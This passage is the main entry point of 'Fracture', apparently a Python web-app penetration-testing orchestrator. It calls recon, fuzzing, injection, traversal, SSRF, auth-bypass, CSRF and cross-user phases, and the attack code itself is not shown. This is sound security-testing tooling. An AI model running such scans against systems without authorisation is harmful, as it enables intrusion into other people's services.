    vc.status(phase, "Cross-User Testing", "complete", "Done", len(resource_ids), len(resource_ids))
    vc.log("[cross_user] Phase complete", "SUCCESS")


# =============================================================================
# MAIN
# =============================================================================
def _print_banner() -> None:
    _tprint(f"{Fore.RED}{_BANNER}{Style.RESET_ALL}")
    _tprint(f"{Fore.CYAN}  Fracture v{VERSION} — Web Application Penetration Testing Orchestrator{Style.RESET_ALL}")
    _tprint(f"{Fore.CYAN}  OWASP Top 10 2025 Coverage: A01–A10{Style.RESET_ALL}\n")


def main() -> None:
    args = _parse_args()

    if args.list_phases:
        print("\nFracture Phases:\n")
        for name, desc in PHASE_LIST:
            print(f"  {name:<20} {desc}")
        print()
        return

    # Load settings
    settings = _load_settings(args.settings or "")
    cfg      = settings["scan"]

    # Apply CLI overrides
    if args.url:
        cfg["target_url"] = args.url
    if args.project:
        cfg["project"] = args.project
    if args.threads:
        cfg["threads"] = args.threads
    if args.timeout:
        cfg["timeout"] = args.timeout
    if args.no_injection:
        cfg["phases"]["injection"] = False
    if args.no_vulnscan:
        cfg["phases"]["vulnscan"] = False
    if args.no_auth:
        for auth_phase in ("auth_recon", "authorization", "session", "csrf", "cross_user"):
            cfg["phases"][auth_phase] = False

    # CLI auth overrides
    if args.username:
        cfg["auth"]["enabled"]   = True
        cfg["auth"]["username"]  = args.username
        cfg["auth"]["password"]  = args.password or ""
        cfg["auth"]["auth_type"] = args.auth_type or "form"
    if args.login_url:
        cfg["auth"]["login_url"] = args.login_url
    if args.auth_token:
        cfg["auth"]["enabled"]    = True
        cfg["auth"]["auth_token"] = args.auth_token

    # Auto-compute structured project path from engagement fields if not explicitly set
    if not cfg.get("project"):
        eng = settings.get("engagement", {})
        cfg["project"] = str(_build_project_dir(
            eng.get("client_short", ""),
            eng.get("start_date", ""),
            "fracture",
        ))

    # Determine target URLs
    target_url  = cfg.get("target_url", "").rstrip("/")
    target_urls = [u.rstrip("/") for u in cfg.get("target_urls", []) if u]
    if target_url:
        target_urls = [target_url] + [u for u in target_urls if u != target_url]
    # Deduplicate while preserving order
    _seen_urls: set = set()
    target_urls = [u for u in target_urls if u not in _seen_urls and not _seen_urls.add(u)]
    if not target_urls:
        vc.log("No target URL specified. Use --url or set target_url in settings.", "ERROR")
        sys.exit(1)

    if not vc.managed:
        _print_banner()

    vc.log(f"Fracture v{VERSION} starting", "INFO")
    vc.log(f"Target(s): {', '.join(target_urls)}", "INFO")
    vc.log(f"Project:   {cfg['project']}", "INFO")
    vc.log(f"Phases:    {', '.join(k for k, v in cfg['phases'].items() if v)}", "INFO")

    # For each target URL
    for raw_url in target_urls:
        if not raw_url:
            continue
        target = _parse_target(raw_url)
        project_dir = Path(cfg["project"]).resolve()
        if len(target_urls) > 1:
            # Sub-directory per target
            safe_host = _RE_UNSAFE_FNAME.sub("_", target["hostname"])
            project_dir = project_dir / safe_host

        out = OutputManager(str(project_dir))
        pm  = ProgressManager(project_dir / "checkpoint.json")
        eng = settings.get("engagement", {})
        _write_project_meta(
            Path(cfg["project"]).resolve(),
            tool="fracture",
            client_short=eng.get("client_short", ""),
            year=(eng.get("start_date", "") or "")[:4] or datetime.now().strftime("%Y"),
            version=VERSION,
        )

        if pm.get_state()["completed_phases"]:
            vc.log("Checkpoint found — resuming from previous run", "INFO")

        vc.log(f"Output directory: {project_dir}", "INFO")

        # Build sessions
        sess  = _make_session(cfg)
        auth_sess  = _build_auth_session(cfg, "auth")
        auth2_sess = _build_auth_session(cfg, "auth2")

        # Crawl data (shared between phases)
        crawl_data:     dict = {"forms": [], "params": [], "links": []}
        auth_recon_data: dict = {"forms": [], "links": [], "resource_ids": []}

        phases_enabled = cfg.get("phases", {})

        def _skip(phase_name: str) -> bool:
            if not phases_enabled.get(phase_name, False):
                vc.log(f"[{phase_name}] Phase disabled — skipping", "INFO")
                return True
            if pm.is_phase_complete(phase_name):
                vc.log(f"[{phase_name}] Already complete — skipping (checkpoint)", "INFO")
                return True
            return False

        # ── Phase 0: recon ──
        if not _skip("recon"):
            pm.set_phase_status("recon", "running", "HTTP Recon")
            try:
                _phase_recon(target, cfg, pm, out, sess)
                pm.set_phase_status("recon", "complete", "HTTP Recon")
            except Exception as e:
                vc.error(f"Phase recon error: {e}")
                pm.set_phase_status("recon", "error", detail=str(e))

        # ── Phase 0b: screenshot ──
        if not _skip("screenshot"):
            pm.set_phase_status("screenshot", "running", "Screenshot")
            try:
                _phase_screenshot(target, cfg, pm, out)
                pm.set_phase_status("screenshot", "complete", "Screenshot")
            except Exception as e:
                vc.error(f"Phase screenshot error: {e}")
                pm.set_phase_status("screenshot", "error", detail=str(e))

        # ── Phase 0c: webfiles ──
        if not _skip("webfiles"):
            pm.set_phase_status("webfiles", "running", "Web Files")
            try:
                _phase_webfiles(target, cfg, pm, out, sess)
                pm.set_phase_status("webfiles", "complete", "Web Files")
            except Exception as e:
                vc.error(f"Phase webfiles error: {e}")
                pm.set_phase_status("webfiles", "error", detail=str(e))

        # ── Phase 1: tls ──
        if not _skip("tls"):
            pm.set_phase_status("tls", "running", "TLS Analysis")
            try:
                _phase_tls(target, cfg, pm, out, sess)
                pm.set_phase_status("tls", "complete", "TLS Analysis")
            except Exception as e:
                vc.error(f"Phase tls error: {e}")
                pm.set_phase_status("tls", "error", detail=str(e))

        # ── Phase 2: headers ──
        if not _skip("headers"):
            pm.set_phase_status("headers", "running", "Security Headers")
            try:
                _phase_headers(target, cfg, pm, out, sess)
                pm.set_phase_status("headers", "complete", "Security Headers")
            except Exception as e:
                vc.error(f"Phase headers error: {e}")
                pm.set_phase_status("headers", "error", detail=str(e))

        # ── Phase 2b: shcheck ──
        if not _skip("shcheck"):
            pm.set_phase_status("shcheck", "running", "shcheck Header Check")
            try:
                # Pass all configured target_urls as extra_urls for shcheck
                _extra = [u for u in target_urls if u != raw_url]
                _phase_shcheck(target, cfg, pm, out, sess,
                               extra_urls=_extra if _extra else None)
                pm.set_phase_status("shcheck", "complete", "shcheck Header Check")
            except Exception as e:
                vc.error(f"Phase shcheck error: {e}")
                pm.set_phase_status("shcheck", "error", detail=str(e))

        # ── Phase 2c: ffuf ──
        if not _skip("ffuf"):
            pm.set_phase_status("ffuf", "running", "ffuf Fuzzing")
            try:
                _phase_ffuf(target, cfg, pm, out, sess)
                pm.set_phase_status("ffuf", "complete", "ffuf Fuzzing")
            except Exception as e:
                vc.error(f"Phase ffuf error: {e}")
                pm.set_phase_status("ffuf", "error", detail=str(e))

        # ── Phase 3: crawl ──
        if not _skip("crawl"):
            pm.set_phase_status("crawl", "running", "Crawl")
            try:
                crawl_data = _phase_crawl(target, cfg, pm, out, sess)
                pm.set_phase_status("crawl", "complete", "Crawl")
            except Exception as e:
                vc.error(f"Phase crawl error: {e}")
                pm.set_phase_status("crawl", "error", detail=str(e))

        # ── Phase 3c: endpoint tools ──
        # Collect endpoints from recon output files + crawl links, then run
        # screenshot / crawl / brute-force against each discovered endpoint.
        _ep_discovered: list = []
        _hostname = target["hostname"]
        for _gob_name in [f"gobuster_{_hostname}", f"gobuster_files_{_hostname}"]:
            _gob_path = out.output_path("recon", _gob_name)
            if _gob_path.exists():
                try:
                    _ep_discovered.extend(
                        _parse_gobuster_output(_gob_path, target["url"])
                    )
                except Exception:
                    pass
        for _fer_name in [f"feroxbuster_{_hostname}", f"feroxbuster_files_{_hostname}"]:
            _fer_path = out.output_path("recon", _fer_name)
            if _fer_path.exists():
                try:
                    _ep_discovered.extend(_parse_feroxbuster_output(_fer_path))
                except Exception:
                    pass
        _ep_discovered.extend(crawl_data.get("links", []))
        if _ep_discovered:
            try:
                _phase_endpoint_tools(_ep_discovered, target, cfg, pm, out, sess)
            except Exception as e:
                vc.error(f"Phase endpoint_tools error: {e}")

        # ── Phase 3b: jwt ──
        if not _skip("jwt"):
            pm.set_phase_status("jwt", "running", "JWT Testing")
            try:
                _phase_jwt(target, cfg, pm, out, sess, crawl_data)
                pm.set_phase_status("jwt", "complete", "JWT Testing")
            except Exception as e:
                vc.error(f"Phase jwt error: {e}")
                pm.set_phase_status("jwt", "error", detail=str(e))

        # ── Phase 4: injection ──
        if not _skip("injection"):
            pm.set_phase_status("injection", "running", "Injection Testing")
            try:
                _phase_injection(target, cfg, pm, out, sess, crawl_data, fast=args.fast)
                pm.set_phase_status("injection", "complete", "Injection Testing")
            except Exception as e:
                vc.error(f"Phase injection error: {e}")
                pm.set_phase_status("injection", "error", detail=str(e))

        # ── Phase 5: traversal ──
        if not _skip("traversal"):
            pm.set_phase_status("traversal", "running", "Path Traversal")
            try:
                _phase_traversal(target, cfg, pm, out, sess, crawl_data)
                pm.set_phase_status("traversal", "complete", "Path Traversal")
            except Exception as e:
                vc.error(f"Phase traversal error: {e}")
                pm.set_phase_status("traversal", "error", detail=str(e))

        # ── Phase 6: ssrf ──
        if not _skip("ssrf"):
            pm.set_phase_status("ssrf", "running", "SSRF Testing")
            try:
                _phase_ssrf(target, cfg, pm, out, sess, crawl_data)
                pm.set_phase_status("ssrf", "complete", "SSRF Testing")
            except Exception as e:
                vc.error(f"Phase ssrf error: {e}")
                pm.set_phase_status("ssrf", "error", detail=str(e))

        # ── Phase 7: auth_bypass ──
        if not _skip("auth_bypass"):
            pm.set_phase_status("auth_bypass", "running", "Auth Bypass")
            try:
                _phase_auth_bypass(target, cfg, pm, out, sess, crawl_data)
                pm.set_phase_status("auth_bypass", "complete", "Auth Bypass")
            except Exception as e:
                vc.error(f"Phase auth_bypass error: {e}")
                pm.set_phase_status("auth_bypass", "error", detail=str(e))

        # ── Phase 8: files ──
        if not _skip("files"):
            pm.set_phase_status("files", "running", "Sensitive Files")
            try:
                _phase_files(target, cfg, pm, out, sess)
                pm.set_phase_status("files", "complete", "Sensitive Files")
            except Exception as e:
                vc.error(f"Phase files error: {e}")
                pm.set_phase_status("files", "error", detail=str(e))

        # ── Phase 9: vulnscan ──
        if not _skip("vulnscan"):
            pm.set_phase_status("vulnscan", "running", "Vuln Scan")
            try:
                _phase_vulnscan(target, cfg, pm, out, sess, fast=args.fast)
                pm.set_phase_status("vulnscan", "complete", "Vuln Scan")
            except Exception as e:
                vc.error(f"Phase vulnscan error: {e}")
                pm.set_phase_status("vulnscan", "error", detail=str(e))

        # ── Phase 10: graphql ──
        if not _skip("graphql"):
            pm.set_phase_status("graphql", "running", "GraphQL")
            try:
                _phase_graphql(target, cfg, pm, out, sess)
                pm.set_phase_status("graphql", "complete", "GraphQL")
            except Exception as e:
                vc.error(f"Phase graphql error: {e}")
                pm.set_phase_status("graphql", "error", detail=str(e))

        # ── Authenticated phases ──
        effective_auth = auth_sess or sess

        # ── Phase 11: auth_recon ──
        if not _skip("auth_recon"):
            if not cfg["auth"].get("enabled"):
                vc.log("[auth_recon] auth not enabled — skipping", "WARNING")
                pm.set_phase_status("auth_recon", "skipped", "auth_recon")
            else:
                pm.set_phase_status("auth_recon", "running", "Auth Recon")
                try:
                    auth_recon_data = _phase_auth_recon(
                        target, cfg, pm, out, effective_auth, crawl_data)
                    pm.set_phase_status("auth_recon", "complete", "Auth Recon")
                except Exception as e:
                    vc.error(f"Phase auth_recon error: {e}")
                    pm.set_phase_status("auth_recon", "error", detail=str(e))

        # ── Phase 12: authorization ──
        if not _skip("authorization"):
            if not cfg["auth"].get("enabled"):
                vc.log("[authorization] auth not enabled — skipping", "WARNING")
                pm.set_phase_status("authorization", "skipped", "authorization")
            else:
                pm.set_phase_status("authorization", "running", "Authorization")
                try:
                    _phase_authorization(target, cfg, pm, out, effective_auth, auth_recon_data)
                    pm.set_phase_status("authorization", "complete", "Authorization")
                except Exception as e:
                    vc.error(f"Phase authorization error: {e}")
                    pm.set_phase_status("authorization", "error", detail=str(e))

        # ── Phase 13: session ──
        if not _skip("session"):
            if not cfg["auth"].get("enabled"):
                vc.log("[session] auth not enabled — skipping", "WARNING")
                pm.set_phase_status("session", "skipped", "session")
            else:
                pm.set_phase_status("session", "running", "Session Analysis")
                try:
                    _phase_session(target, cfg, pm, out, effective_auth)
                    pm.set_phase_status("session", "complete", "Session Analysis")
                except Exception as e:
                    vc.error(f"Phase session error: {e}")
                    pm.set_phase_status("session", "error", detail=str(e))

        # ── Phase 14: csrf ──
        if not _skip("csrf"):
            if not cfg["auth"].get("enabled"):
                vc.log("[csrf] auth not enabled — skipping", "WARNING")
                pm.set_phase_status("csrf", "skipped", "csrf")
            else:
                pm.set_phase_status("csrf", "running", "CSRF Testing")
                try:
                    _phase_csrf(target, cfg, pm, out, effective_auth, auth_recon_data)
                    pm.set_phase_status("csrf", "complete", "CSRF Testing")
                except Exception as e:
                    vc.error(f"Phase csrf error: {e}")
                    pm.set_phase_status("csrf", "error", detail=str(e))

        # ── Phase 15: cross_user ──
        if not _skip("cross_user"):
            if not cfg["auth"].get("enabled") or not cfg["auth2"].get("enabled"):
                vc.log("[cross_user] auth and/or auth2 not enabled — skipping", "WARNING")
                pm.set_phase_status("cross_user", "skipped", "cross_user")
            elif not auth2_sess:
                vc.log("[cross_user] auth2 session could not be established — skipping", "WARNING")
                pm.set_phase_status("cross_user", "skipped", "cross_user")
            else:
                pm.set_phase_status("cross_user", "running", "Cross-User Testing")
                try:
                    _phase_cross_user(target, cfg, pm, out, effective_auth,
                                      auth2_sess, auth_recon_data)
                    pm.set_phase_status("cross_user", "complete", "Cross-User Testing")
                except Exception as e:
                    vc.error(f"Phase cross_user error: {e}")
                    pm.set_phase_status("cross_user", "error", detail=str(e))

        # Write summary
        try:
            findings = json.loads(out.findings_json.read_text(encoding="utf-8"))
        except Exception:
            findings = []

        out.write_summary({
            "target": target["url"],
            "project": str(project_dir),
            "phases_run": [k for k, v in phases_enabled.items() if v],
            "checkpoint": pm.get_state(),
        })

        vc.log(f"Scan complete. Findings: {len(findings)}", "SUCCESS")
        vc.log(f"Output: {project_dir}", "INFO")

        if not vc.managed:
            _tprint(f"\n{Fore.GREEN}[+] Scan complete!{Style.RESET_ALL}")
            _tprint(f"    Findings  : {len(findings)}")
            _tprint(f"    Output    : {project_dir}")
            _tprint(f"    JSON      : {out.findings_json}")
            _tprint(f"    CSV       : {out.findings_csv}")
            risk_counts: dict = {}
            for f in findings:
                r = (f.get("risk") or "INFO").upper()
                risk_counts[r] = risk_counts.get(r, 0) + 1
            for r in ("CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"):
                if risk_counts.get(r, 0):
                    colour = {
                        "CRITICAL": Fore.RED, "HIGH": Fore.RED,
                        "MEDIUM": Fore.YELLOW, "LOW": Fore.CYAN, "INFO": Fore.WHITE,
                    }.get(r, "")
                    _tprint(f"    {colour}{r:<10}{Style.RESET_ALL}: {risk_counts[r]}")
            _tprint()


if __name__ == "__main__":
    main()
